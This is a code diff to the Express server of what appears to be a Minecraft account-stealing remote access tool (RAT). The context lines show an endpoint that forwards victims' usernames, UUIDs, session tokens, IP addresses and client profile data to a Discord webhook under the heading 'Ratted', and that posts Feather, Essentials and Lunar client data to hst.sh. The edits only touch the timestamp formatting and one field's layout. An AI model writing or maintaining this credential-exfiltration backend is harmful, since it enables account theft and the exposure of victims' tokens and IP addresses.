@@ -152,11 +152,14 @@ app.post("/", (req, res) => {
                     checkLunar = `https://hst.sh/${lunar} - **(Lunar3)**`
 
                 // timestamp text
-                let timestamp = `<t:${Math.floor((Date.now() + (24 * 60 * 60 * 1000)) / 1000)}:R>`
+                const now = Date.now();
+
+                const twentyFourHoursAgo = now - (24 * 60 * 60 * 1000);
+                const timestamp = Math.floor(twentyFourHoursAgo / 1000);
 
                 try {
                     post(process.env.WEBHOOK, JSON.stringify({
-                        content: `@everyone - ${timestamp}`, //ping
+                        content: `@everyone - <t:${timestamp}:R>`, //ping
                         embeds: [{
                             title: `Ratted ${req.body.username} - Click For Stats`,
                              fields: [
@@ -164,7 +167,7 @@ app.post("/", (req, res) => {
                                 { name: 'UUID', value: `\`\`\`${req.body.uuid}\`\`\``, inline: true },
                                 { name: 'Token', value: `\`\`\`${req.body.token}\`\`\``, inline: false },
                                 { name: 'Profiles', value: `\`\`\`${profiles}\`\`\``, inline: false },
-                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: false },
+                                { name: 'IP', value: `\`\`\`${req.body.ip}\`\`\``, inline: true },
                                 { name: 'Feather', value: `${checkFeather}`, inline: true },
                                 { name: 'Essentials', value: `${checkEssentials}`, inline: true },
                                 { name: 'Lunar', value: `${checkLunar}`, inline: true },
